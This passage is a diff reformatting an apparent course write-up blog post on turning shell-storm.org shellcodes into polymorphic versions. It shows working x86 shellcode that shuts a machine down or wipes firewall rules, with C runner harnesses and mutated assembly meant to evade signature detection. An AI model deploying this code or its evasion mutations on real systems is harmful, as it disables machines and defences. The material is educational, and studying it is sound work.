@@ -1,85 +1,4 @@
-<!doctype html><html lang=en><head>
-<meta name=viewport content="width=device-width,initial-scale=1">
-<meta charset=utf-8>
-<meta content="utf-8" http-equiv=encoding>
-<link rel=preload href=/fonts/FiraCode-VariableFont_wght.ttf as=font type=font/ttf crossorigin>
-<link rel=stylesheet href=/css/grid.css type=text/css>
-<link rel=stylesheet href=/css/highlight.css type=text/css>
-<link rel=stylesheet href=/css/main.css type=text/css>
-<meta name=apple-mobile-web-app-title content="dubell.io | SLAE 6: Creating polymorphic shellcode">
-<meta name=apple-mobile-web-app-capable content="yes">
-<meta name=apple-mobile-web-app-status-bar-style content="black-translucent">
-<meta name=twitter:site content="@dubs3c">
-<meta name=twitter:creator content="@dubs3c">
-<meta property="og:title" content="dubell.io | SLAE 6: Creating polymorphic shellcode">
-<meta name=twitter:title content="dubell.io | SLAE 6: Creating polymorphic shellcode">
-<meta itemprop=name content="dubell.io | SLAE 6: Creating polymorphic shellcode">
-<meta name=application-name content="dubell.io | SLAE 6: Creating polymorphic shellcode">
-<meta property="og:site_name" content="dubell.io">
-<meta property="og:article:published_time" content="2020-01-26T13:33:37Z">
-<meta property="article:published_time" content="2020-01-26T13:33:37Z">
-<base href=/www/slae-6-polymorphic_shellcode/>
-<link rel=canonical href=/www/slae-6-polymorphic_shellcode/ itemprop=url>
-<meta name=url content="/www/slae-6-polymorphic_shellcode/">
-<meta name=twitter:url content="/www/slae-6-polymorphic_shellcode/">
-<meta property="og:url" content="/www/slae-6-polymorphic_shellcode/">
-<meta property="og:article:author" content="Dubs3c">
-<meta property="article:author" content="Dubs3c">
-<meta name=author content="Dubs3c">
-<meta name=description content="Polymorphic shellcode">
-<meta itemprop=description content="Polymorphic shellcode">
-<meta property="og:description" content="Polymorphic shellcode">
-<meta name=twitter:description content="Polymorphic shellcode">
-<meta itemprop=image content="/img/hacker2.jpg">
-<meta property="og:image" content="/img/hacker2.jpg">
-<meta name=twitter:image content="/img/hacker2.jpg">
-<meta name=twitter:image:src content="/img/hacker2.jpg">
-<meta property="og:updated_time" content="2020-01-26T13:33:37Z">
-<link rel=sitemap type=application/xml title=Sitemap href=sitemap.xml>
-<title>dubell.io | SLAE 6: Creating polymorphic shellcode</title>
-</head><body>
-<div id=particles-js></div>
-<main><div class=row>
-<header class="col center">
-<a href=/ class=noleet><img href=/ class=banner-image src=/img/logo2.png alt=logo></a>
-</div>
-</div>
-<div class=row>
-<div class="col center">
-<nav>
-<fieldset>
-<legend>n4vig4ti0n</legend>
-<ul>
-<li><a href=/>/etc/motd</a></li>
-<li><a href=/www/>/var/www</a></li>
-<li><a href=/mnt/>/mnt</a></li>
-<li><a href=/usr/>/usr</a></li>
-</ul>
-</fieldset>
-</nav>
-</div>
-</div>
-<div class=content>
-<article>
-<h1>SLAE 6: Creating polymorphic shellcode</h1>
-<br>
-<p class=small style=color:#999>
-<a href=/categories/programming>Programming</a> / January 26, 2020 • 9 min read </p>
-<p class=small><strong>Tags:</strong> <a href=/tags/slae class=tag>slae</a> <a href=/tags/shellcoding class=tag>shellcoding</a> </p>
-<br>
-<p>The goal of this article is to create polymorphic verions of three different shellcodes from <a href=http://shell-storm.org>http://shell-storm.org</a>. Polymorphic shellcode has the ability to mutate its code everytime it runs. The instructions changes while algorithm stays intact. The purpose is to evade signature based detections without manually change the shellcode.</p>
-<p>We won&rsquo;t be creating our own polymorphic engine in this article, instead we will manually modify these three shellcodes from shell-storm.org:</p>
-<ul>
-<li><a href=http://shell-storm.org/shellcode/files/shellcode-876.php>Linux/x86 - shutdown -h now Shellcode - 56 bytes</a></li>
-<li><a href=http://shell-storm.org/shellcode/files/shellcode-65.php>Linux/x86 - 40 byte shellcode to flush ipchains for Linux x86</a></li>
-<li><a href=http://shell-storm.org/shellcode/files/shellcode-862.php>Linux/x86 - Download + chmod + exec - 108 bytes </a></li>
-</ul>
-<p>We are not allowed to increase the size more than 50%.</p>
-<h2 id=shellcode-1-shutdown--h-now---56-bytes>Shellcode 1: shutdown -h now - 56 bytes</h2>
-<p>The following program will shutdown your computer immediately when run:</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+<!doctype html><html lang=en><head><meta name=viewport content="width=device-width,initial-scale=1"><meta charset=utf-8><meta content="utf-8" http-equiv=encoding><link rel=preload href=/fonts/FiraCode-VariableFont_wght.ttf as=font type=font/ttf crossorigin><link rel=stylesheet href=/css/grid.css type=text/css><link rel=stylesheet href=/css/highlight.css type=text/css><link rel=stylesheet href=/css/main.css type=text/css><meta name=apple-mobile-web-app-title content="dubell.io | SLAE 6: Creating polymorphic shellcode"><meta name=apple-mobile-web-app-capable content="yes"><meta name=apple-mobile-web-app-status-bar-style content="black-translucent"><meta name=twitter:site content="@dubs3c"><meta name=twitter:creator content="@dubs3c"><meta property="og:title" content="dubell.io | SLAE 6: Creating polymorphic shellcode"><meta name=twitter:title content="dubell.io | SLAE 6: Creating polymorphic shellcode"><meta itemprop=name content="dubell.io | SLAE 6: Creating polymorphic shellcode"><meta name=application-name content="dubell.io | SLAE 6: Creating polymorphic shellcode"><meta property="og:site_name" content="dubell.io"><meta property="og:article:published_time" content="2020-01-26T13:33:37Z"><meta property="article:published_time" content="2020-01-26T13:33:37Z"><base href=/www/slae-6-polymorphic_shellcode/><link rel=canonical href=/www/slae-6-polymorphic_shellcode/ itemprop=url><meta name=url content="/www/slae-6-polymorphic_shellcode/"><meta name=twitter:url content="/www/slae-6-polymorphic_shellcode/"><meta property="og:url" content="/www/slae-6-polymorphic_shellcode/"><meta property="og:article:author" content="Dubs3c"><meta property="article:author" content="Dubs3c"><meta name=author content="Dubs3c"><meta name=description content="Polymorphic shellcode"><meta itemprop=description content="Polymorphic shellcode"><meta property="og:description" content="Polymorphic shellcode"><meta name=twitter:description content="Polymorphic shellcode"><meta itemprop=image content="/img/hacker2.jpg"><meta property="og:image" content="/img/hacker2.jpg"><meta name=twitter:image content="/img/hacker2.jpg"><meta name=twitter:image:src content="/img/hacker2.jpg"><meta property="og:updated_time" content="2020-01-26T13:33:37Z"><link rel=sitemap type=application/xml title=Sitemap href=sitemap.xml><title>dubell.io | SLAE 6: Creating polymorphic shellcode</title></head><body><div id=particles-js></div><main><div class=row><header class="col center"><a href=/ class=noleet><img href=/ class=banner-image src=/img/logo2.png alt=logo></a></div></div><div class=row><div class="col center"><nav><fieldset><legend>n4vig4ti0n</legend><ul><li><a href=/>/etc/motd</a></li><li><a href=/www/>/var/www</a></li><li><a href=/mnt/>/mnt</a></li><li><a href=/usr/>/usr</a></li></ul></fieldset></nav></div></div><div class=content><article><h1>SLAE 6: Creating polymorphic shellcode</h1><br><p class=small style=color:#999><a href=/categories/programming>Programming</a> / January 26, 2020 • 9 min read</p><p class=small><strong>Tags:</strong> <a href=/tags/slae class=tag>slae</a> <a href=/tags/shellcoding class=tag>shellcoding</a></p><br><p>The goal of this article is to create polymorphic verions of three different shellcodes from <a href=http://shell-storm.org>http://shell-storm.org</a>. Polymorphic shellcode has the ability to mutate its code everytime it runs. The instructions changes while algorithm stays intact. The purpose is to evade signature based detections without manually change the shellcode.</p><p>We won&rsquo;t be creating our own polymorphic engine in this article, instead we will manually modify these three shellcodes from shell-storm.org:</p><ul><li><a href=http://shell-storm.org/shellcode/files/shellcode-876.php>Linux/x86 - shutdown -h now Shellcode - 56 bytes</a></li><li><a href=http://shell-storm.org/shellcode/files/shellcode-65.php>Linux/x86 - 40 byte shellcode to flush ipchains for Linux x86</a></li><li><a href=http://shell-storm.org/shellcode/files/shellcode-862.php>Linux/x86 - Download + chmod + exec - 108 bytes</a></li></ul><p>We are not allowed to increase the size more than 50%.</p><h2 id=shellcode-1-shutdown--h-now---56-bytes>Shellcode 1: shutdown -h now - 56 bytes</h2><p>The following program will shutdown your computer immediately when run:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -133,68 +52,61 @@
 </span><span class=lnt>52
 </span><span class=lnt>53
 </span><span class=lnt>54
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=cm>/*
-</span><span class=cm>; Title: shutdown -h now Shellcode - 56 bytes
-</span><span class=cm>; Date: 2014-06-27
-</span><span class=cm>; Platform: linux/x86
-</span><span class=cm>; Author: Osanda Malith Jayathissa (@OsandaMalith)
-</span><span class=cm>
-</span><span class=cm>Disassembly of section .text:
-</span><span class=cm>
-</span><span class=cm>08048060 &lt;_start&gt;:
-</span><span class=cm>8048060:    31 c0                   xor    eax,eax
-</span><span class=cm>8048062:    31 d2                   xor    edx,edx
-</span><span class=cm>8048064:    50                      push   eax
-</span><span class=cm>8048065:    66 68 2d 68             pushw  0x682d
-</span><span class=cm>8048069:    89 e7                   mov    edi,esp
-</span><span class=cm>804806b:    50                      push   eax
-</span><span class=cm>804806c:    6a 6e                   push   0x6e
-</span><span class=cm>804806e:    66 c7 44 24 01 6f 77    mov    WORD PTR [esp+0x1],0x776f
-</span><span class=cm>8048075:    89 e7                   mov    edi,esp
-</span><span class=cm>8048077:    50                      push   eax
-</span><span class=cm>8048078:    68 64 6f 77 6e          push   0x6e776f64
-</span><span class=cm>804807d:    68 73 68 75 74          push   0x74756873
-</span><span class=cm>8048082:    68 6e 2f 2f 2f          push   0x2f2f2f6e
-</span><span class=cm>8048087:    68 2f 73 62 69          push   0x6962732f
-</span><span class=cm>804808c:    89 e3                   mov    ebx,esp
-</span><span class=cm>804808e:    52                      push   edx
-</span><span class=cm>804808f:    56                      push   esi
-</span><span class=cm>8048090:    57                      push   edi
-</span><span class=cm>8048091:    53                      push   ebx
-</span><span class=cm>8048092:    89 e1                   mov    ecx,esp
-</span><span class=cm>8048094:    b0 0b                   mov    al,0xb
-</span><span class=cm>8048096:    cd 80                   int    0x80
-</span><span class=cm>
-</span><span class=cm>*/</span>
-
-<span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
-</span><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
-</span><span class=cp></span>
-<span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>code</span><span class=p>[]</span> <span class=o>=</span>  <span class=s>&#34;</span><span class=se>\x31\xc0\x31\xd2\x50\x66\x68\x2d</span><span class=s>&#34;</span>
-<span class=s>&#34;</span><span class=se>\x68\x89\xe7\x50\x6a\x6e\x66\xc7</span><span class=s>&#34;</span>
-<span class=s>&#34;</span><span class=se>\x44\x24\x01\x6f\x77\x89\xe7\x50</span><span class=s>&#34;</span>
-<span class=s>&#34;</span><span class=se>\x68\x64\x6f\x77\x6e\x68\x73\x68</span><span class=s>&#34;</span>
-<span class=s>&#34;</span><span class=se>\x75\x74\x68\x6e\x2f\x2f\x2f\x68</span><span class=s>&#34;</span>
-<span class=s>&#34;</span><span class=se>\x2f\x73\x62\x69\x89\xe3\x52\x56</span><span class=s>&#34;</span>
-<span class=s>&#34;</span><span class=se>\x57\x53\x89\xe1\xb0\x0b\xcd\x80</span><span class=s>&#34;</span><span class=p>;</span>
-
-<span class=kt>int</span>
-<span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
-
-<span class=n>printf</span><span class=p>(</span><span class=s>&#34;Shellcode Length:  %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>int</span><span class=p>)</span><span class=n>strlen</span><span class=p>(</span><span class=n>code</span><span class=p>));</span>
-<span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>ret</span><span class=p>)()</span> <span class=o>=</span> <span class=p>(</span><span class=kt>int</span><span class=p>(</span><span class=o>*</span><span class=p>)())</span><span class=n>code</span><span class=p>;</span>
-<span class=n>ret</span><span class=p>();</span>
-
-<span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
-<span class=p>}</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>I extracted the assembly code and modified it manually. The comments prefixed with <code>[M]</code> indicates that the instruction has been modified.</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/*
+</span></span></span><span class=line><span class=cl><span class=cm>; Title: shutdown -h now Shellcode - 56 bytes
+</span></span></span><span class=line><span class=cl><span class=cm>; Date: 2014-06-27
+</span></span></span><span class=line><span class=cl><span class=cm>; Platform: linux/x86
+</span></span></span><span class=line><span class=cl><span class=cm>; Author: Osanda Malith Jayathissa (@OsandaMalith)
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>Disassembly of section .text:
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>08048060 &lt;_start&gt;:
+</span></span></span><span class=line><span class=cl><span class=cm>8048060:    31 c0                   xor    eax,eax
+</span></span></span><span class=line><span class=cl><span class=cm>8048062:    31 d2                   xor    edx,edx
+</span></span></span><span class=line><span class=cl><span class=cm>8048064:    50                      push   eax
+</span></span></span><span class=line><span class=cl><span class=cm>8048065:    66 68 2d 68             pushw  0x682d
+</span></span></span><span class=line><span class=cl><span class=cm>8048069:    89 e7                   mov    edi,esp
+</span></span></span><span class=line><span class=cl><span class=cm>804806b:    50                      push   eax
+</span></span></span><span class=line><span class=cl><span class=cm>804806c:    6a 6e                   push   0x6e
+</span></span></span><span class=line><span class=cl><span class=cm>804806e:    66 c7 44 24 01 6f 77    mov    WORD PTR [esp+0x1],0x776f
+</span></span></span><span class=line><span class=cl><span class=cm>8048075:    89 e7                   mov    edi,esp
+</span></span></span><span class=line><span class=cl><span class=cm>8048077:    50                      push   eax
+</span></span></span><span class=line><span class=cl><span class=cm>8048078:    68 64 6f 77 6e          push   0x6e776f64
+</span></span></span><span class=line><span class=cl><span class=cm>804807d:    68 73 68 75 74          push   0x74756873
+</span></span></span><span class=line><span class=cl><span class=cm>8048082:    68 6e 2f 2f 2f          push   0x2f2f2f6e
+</span></span></span><span class=line><span class=cl><span class=cm>8048087:    68 2f 73 62 69          push   0x6962732f
+</span></span></span><span class=line><span class=cl><span class=cm>804808c:    89 e3                   mov    ebx,esp
+</span></span></span><span class=line><span class=cl><span class=cm>804808e:    52                      push   edx
+</span></span></span><span class=line><span class=cl><span class=cm>804808f:    56                      push   esi
+</span></span></span><span class=line><span class=cl><span class=cm>8048090:    57                      push   edi
+</span></span></span><span class=line><span class=cl><span class=cm>8048091:    53                      push   ebx
+</span></span></span><span class=line><span class=cl><span class=cm>8048092:    89 e1                   mov    ecx,esp
+</span></span></span><span class=line><span class=cl><span class=cm>8048094:    b0 0b                   mov    al,0xb
+</span></span></span><span class=line><span class=cl><span class=cm>8048096:    cd 80                   int    0x80
+</span></span></span><span class=line><span class=cl><span class=cm>
+</span></span></span><span class=line><span class=cl><span class=cm>*/</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;stdio.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp>#include</span> <span class=cpf>&lt;string.h&gt;</span><span class=cp>
+</span></span></span><span class=line><span class=cl><span class=cp></span>
+</span></span><span class=line><span class=cl><span class=kt>unsigned</span> <span class=kt>char</span> <span class=n>code</span><span class=p>[]</span> <span class=o>=</span>  <span class=s>&#34;</span><span class=se>\x31\xc0\x31\xd2\x50\x66\x68\x2d</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x68\x89\xe7\x50\x6a\x6e\x66\xc7</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x44\x24\x01\x6f\x77\x89\xe7\x50</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x68\x64\x6f\x77\x6e\x68\x73\x68</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x75\x74\x68\x6e\x2f\x2f\x2f\x68</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x2f\x73\x62\x69\x89\xe3\x52\x56</span><span class=s>&#34;</span>
+</span></span><span class=line><span class=cl><span class=s>&#34;</span><span class=se>\x57\x53\x89\xe1\xb0\x0b\xcd\x80</span><span class=s>&#34;</span><span class=p>;</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=kt>int</span>
+</span></span><span class=line><span class=cl><span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>printf</span><span class=p>(</span><span class=s>&#34;Shellcode Length:  %d</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span> <span class=p>(</span><span class=kt>int</span><span class=p>)</span><span class=n>strlen</span><span class=p>(</span><span class=n>code</span><span class=p>));</span>
+</span></span><span class=line><span class=cl><span class=kt>int</span> <span class=p>(</span><span class=o>*</span><span class=n>ret</span><span class=p>)()</span> <span class=o>=</span> <span class=p>(</span><span class=kt>int</span><span class=p>(</span><span class=o>*</span><span class=p>)())</span><span class=n>code</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=n>ret</span><span class=p>();</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p>I extracted the assembly code and modified it manually. The comments prefixed with <code>[M]</code> indicates that the instruction has been modified.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -223,49 +135,39 @@
 </span><span class=lnt>27
 </span><span class=lnt>28
 </span><span class=lnt>29
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=nf>global</span> <span class=no>_start</span>
-
-<span class=nf>section</span> <span class=no>.text</span>
-
-<span class=nl>_start:</span>
-
-    <span class=nf>xor</span>    <span class=no>ecx</span><span class=p>,</span><span class=no>ecx</span>                      <span class=c>; [M] clear ecx
-</span><span class=c></span>    <span class=no>mul</span>    <span class=no>ecx</span>                          <span class=c>; [M] clear both eax and edx
-</span><span class=c></span>    <span class=no>push</span>   <span class=no>edx</span>                          <span class=c>; [M] push edx instead of eax
-</span><span class=c></span>    <span class=no>push</span> <span class=no>word</span> <span class=mi>0x682d</span>                    <span class=c>; -h option
-</span><span class=c></span>    <span class=no>mov</span>    <span class=no>edi</span><span class=p>,</span><span class=no>esp</span>                      <span class=c>; save stack pointer to edi
-</span><span class=c></span>    <span class=no>push</span>   <span class=no>eax</span>                          <span class=c>; push null
-</span><span class=c></span>    <span class=no>push</span> <span class=no>byte</span> <span class=mi>0x6e</span>                      <span class=c>; &#34;n&#34; character
-</span><span class=c></span>    <span class=no>mov</span> <span class=no>byte</span> <span class=p>[</span><span class=no>esp</span><span class=err>+</span><span class=mi>1</span><span class=p>],</span> <span class=mi>0x6f</span>              <span class=c>; [M] &#34;o&#34; character
-</span><span class=c></span>    <span class=no>mov</span> <span class=no>byte</span> <span class=p>[</span><span class=no>esp</span><span class=err>+</span><span class=mi>2</span><span class=p>],</span> <span class=mi>0x77</span>              <span class=c>; [M] &#34;w&#34; character
-</span><span class=c></span>    <span class=no>mov</span>    <span class=no>edi</span><span class=p>,</span><span class=no>esp</span>                      <span class=c>; save stack pointer to edi
-</span><span class=c></span>    <span class=no>push</span>   <span class=no>eax</span>                          <span class=c>; push null
-</span><span class=c></span>    <span class=no>push</span>   <span class=mi>0x6e776f64</span>                   <span class=c>; these four push instructions correspond to /sbin///shutdown
-</span><span class=c></span>    <span class=no>push</span>   <span class=mi>0x74756873</span>
-    <span class=nf>push</span>   <span class=mi>0x2f2f2f6e</span>
-    <span class=nf>push</span>   <span class=mi>0x6962732f</span>
-    <span class=nf>mov</span>    <span class=no>ebx</span><span class=p>,</span><span class=no>esp</span>                      <span class=c>; save stack pointer to ebx
-</span><span class=c></span>    <span class=no>push</span>   <span class=no>edx</span>                          <span class=c>; push null
-</span><span class=c></span>    <span class=no>push</span>   <span class=no>esi</span>
-    <span class=nf>push</span>   <span class=no>edi</span>                          <span class=c>; points to &#34;-h now&#34;
-</span><span class=c></span>    <span class=no>push</span>   <span class=no>ebx</span>                          <span class=c>; points to /sbin///shutdown
-</span><span class=c></span>    <span class=no>mov</span>    <span class=no>ecx</span><span class=p>,</span><span class=no>esp</span>                      <span class=c>; save stack pointer to ecx
-</span><span class=c></span>    <span class=no>mov</span>    <span class=no>al</span><span class=p>,</span><span class=mi>0xc</span><span class=p>-</span><span class=mi>1</span>                     <span class=c>; [M] 0xc - 1 = 0xb which is execve() syscall
-</span><span class=c></span>    <span class=no>int</span>    <span class=mi>0x80</span>                         <span class=c>; Execute syscall
-</span></code></pre></td></tr></table>
-</div>
-</div><p>Running the modified version returns:</p>
-<pre tabindex=0><code>dubs3c@slae:~/SLAE/EXAM/github/assignment_6$ ./shellcode
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-asm data-lang=asm><span class=line><span class=cl><span class=nf>global</span> <span class=no>_start</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nf>section</span> <span class=no>.text</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=nl>_start:</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    <span class=nf>xor</span>    <span class=no>ecx</span><span class=p>,</span><span class=no>ecx</span>                      <span class=c>; [M] clear ecx
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>mul</span>    <span class=no>ecx</span>                          <span class=c>; [M] clear both eax and edx
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>push</span>   <span class=no>edx</span>                          <span class=c>; [M] push edx instead of eax
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>push</span> <span class=no>word</span> <span class=mi>0x682d</span>                    <span class=c>; -h option
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>mov</span>    <span class=no>edi</span><span class=p>,</span><span class=no>esp</span>                      <span class=c>; save stack pointer to edi
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>push</span>   <span class=no>eax</span>                          <span class=c>; push null
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>push</span> <span class=no>byte</span> <span class=mi>0x6e</span>                      <span class=c>; &#34;n&#34; character
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>mov</span> <span class=no>byte</span> <span class=p>[</span><span class=no>esp</span><span class=err>+</span><span class=mi>1</span><span class=p>],</span> <span class=mi>0x6f</span>              <span class=c>; [M] &#34;o&#34; character
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>mov</span> <span class=no>byte</span> <span class=p>[</span><span class=no>esp</span><span class=err>+</span><span class=mi>2</span><span class=p>],</span> <span class=mi>0x77</span>              <span class=c>; [M] &#34;w&#34; character
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>mov</span>    <span class=no>edi</span><span class=p>,</span><span class=no>esp</span>                      <span class=c>; save stack pointer to edi
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>push</span>   <span class=no>eax</span>                          <span class=c>; push null
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>push</span>   <span class=mi>0x6e776f64</span>                   <span class=c>; these four push instructions correspond to /sbin///shutdown
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>push</span>   <span class=mi>0x74756873</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span>   <span class=mi>0x2f2f2f6e</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span>   <span class=mi>0x6962732f</span>
+</span></span><span class=line><span class=cl>    <span class=nf>mov</span>    <span class=no>ebx</span><span class=p>,</span><span class=no>esp</span>                      <span class=c>; save stack pointer to ebx
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>push</span>   <span class=no>edx</span>                          <span class=c>; push null
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>push</span>   <span class=no>esi</span>
+</span></span><span class=line><span class=cl>    <span class=nf>push</span>   <span class=no>edi</span>                          <span class=c>; points to &#34;-h now&#34;
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>push</span>   <span class=no>ebx</span>                          <span class=c>; points to /sbin///shutdown
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>mov</span>    <span class=no>ecx</span><span class=p>,</span><span class=no>esp</span>                      <span class=c>; save stack pointer to ecx
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>mov</span>    <span class=no>al</span><span class=p>,</span><span class=mi>0xc</span><span class=p>-</span><span class=mi>1</span>                     <span class=c>; [M] 0xc - 1 = 0xb which is execve() syscall
+</span></span></span><span class=line><span class=cl><span class=c></span>    <span class=no>int</span>    <span class=mi>0x80</span>                         <span class=c>; Execute syscall
+</span></span></span></code></pre></td></tr></table></div></div><p>Running the modified version returns:</p><pre tabindex=0><code>dubs3c@slae:~/SLAE/EXAM/github/assignment_6$ ./shellcode
 Shellcode length:  59
 shutdown: Need to be root
-</code></pre><p>Nice! We only added 3 extra bytes. Running the program as <code>root</code> shuts down the computer.</p>
-<h2 id=shellcode-2--40-byte-shellcode-to-flush-ipchains-for-linux-x86>Shellcode 2: 40 byte shellcode to flush ipchains for Linux x86</h2>
-<p>The purpose of the next shellcode is to delete all ipchains entries. So any firewall rules set in place will be wiped out.</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt> 1
+</code></pre><p>Nice! We only added 3 extra bytes. Running the program as <code>root</code> shuts down the computer.</p><h2 id=shellcode-2--40-byte-shellcode-to-flush-ipchains-for-linux-x86>Shellcode 2: 40 byte shellcode to flush ipchains for Linux x86</h2><p>The purpose of the next shellcode is to delete all ipchains entries. So any firewall rules set in place will be wiped out.</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
 </span><span class=lnt> 2
 </span><span class=lnt> 3
 </span><span class=lnt> 4
@@ -308,70 +210,56 @@ shutdown: Need to be root
 </span><span class=lnt>41
 </span><span class=lnt>42
 </span><span class=lnt>43
-</span></code></pre></td>
-<td class=lntd>
-<pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=cm>/* By Kris Katterjohn 11/18/2006
-</span><span class=cm> *
-</span><span class=cm> * 40 byte shellcode to flush ipchains for Linux x86
-</span><span class=cm> *
-</span><span class=cm> *
-</span><span class=cm> *
-</span><span class=cm> * section .text
-</span><span class=cm> *
-</span><span class=cm> *      global _start
-</span><span class=cm> *
-</span><span class=cm> * _start:
-</span><span class=cm> *
-</span><span class=cm> * ; execve(&#34;/sbin/ipchains&#34;, { &#34;/sbin/ipchains&#34;, &#34;-F&#34;, NULL }, NULL)
-</span><span class=cm> *
-</span><span class=cm> *      push byte 11
-</span><span class=cm> *      pop eax
-</span><span class=cm> *      cdq
-</span><span class=cm> *      push edx
-</span><span class=cm> *      push word 0x462d
-</span><span class=cm> *      mov ecx, esp
-</span><span class=cm> *      push edx
-</span><span class=cm> *      push word 0x736e
-</span><span class=cm> *      push 0x69616863
-</span><span class=cm> *      push 0x70692f6e
-</span><span class=cm> *      push 0x6962732f
-</span><span class=cm> *      mov ebx, esp
-</span><span class=cm> *      push edx
-</span><span class=cm> *      push ecx
-</span><span class=cm> *      push ebx
-</span><span class=cm> *      mov ecx, esp
-</span><span class=cm> *      int 0x80
-</span><span class=cm> */</span>
-
-<span class=n>main</span><span class=p>()</span>
-<span class=p>{</span>
-       <span class=kt>char</span> <span class=n>shellcode</span><span class=p>[]</span> <span class=o>=</span>
-               <span class=s>&#34;</span><span class=se>\x6a\x0b\x58\x99\x52\x66\x68\x2d\x46\x89</span><span class=s>&#34;</span>
-               <span class=s>&#34;</span><span class=se>\xe1\x52\x66\x68\x6e\x73\x68\x63\x68\x61</span><span class=s>&#34;</span>
-               <span class=s>&#34;</span><span class=se>\x69\x68\x6e\x2f\x69\x70\x68\x2f\x73\x62</span><span class=s>&#34;</span>
-               <span class=s>&#34;</span><span class=se>\x69\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80</span><span class=s>&#34;</span><span class=p>;</span>
-
-       <span class=p>(</span><span class=o>*</span><span class=p>(</span><span class=kt>void</span> <span class=p>(</span><span class=o>*</span><span class=p>)())</span> <span class=n>shellcode</span><span class=p>)();</span>
-<span class=p>}</span>
-</code></pre></td></tr></table>
-</div>
-</div><p>Because I don&rsquo;t have the command <code>ipchains</code> on my system, I cheated a little bit and created the following script in <code>/sbin/ipchains</code>:</p>
-<div class=highlight><div class=chroma>
-<table class=lntable><tr><td class=lntd>
-<pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=cm>/* By Kris Katterjohn 11/18/2006
+</span></span></span><span class=line><span class=cl><span class=cm> *
+</span></span></span><span class=line><span class=cl><span class=cm> * 40 byte shellcode to flush ipchains for Linux x86
+</span></span></span><span class=line><span class=cl><span class=cm> *
+</span></span></span><span class=line><span class=cl><span class=cm> *
+</span></span></span><span class=line><span class=cl><span class=cm> *
